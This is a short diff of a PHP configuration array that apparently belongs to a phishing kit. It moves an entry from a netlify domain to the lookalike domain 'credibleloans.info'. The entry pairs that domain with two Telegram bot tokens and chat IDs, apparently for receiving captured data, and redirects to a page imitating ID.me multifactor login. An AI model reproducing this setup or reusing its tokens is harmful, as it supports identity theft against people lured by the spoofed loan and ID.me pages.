@@ -114,12 +114,12 @@ $site_map = [
 
 
 
-    'crediblely.netlify.app' => [
+    'credibleloans.info' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
             ['token' => '8391318694:AAFIHmYNa3k9HPokaeVJ7oxtWn2UB_iJiUI', 'chat_id' => '7982337001']
         ],
-        'redirect' => 'https://crediblely.netlify.app/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
+        'redirect' => 'https://credibleloans.info/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.html'
     ],
 
 
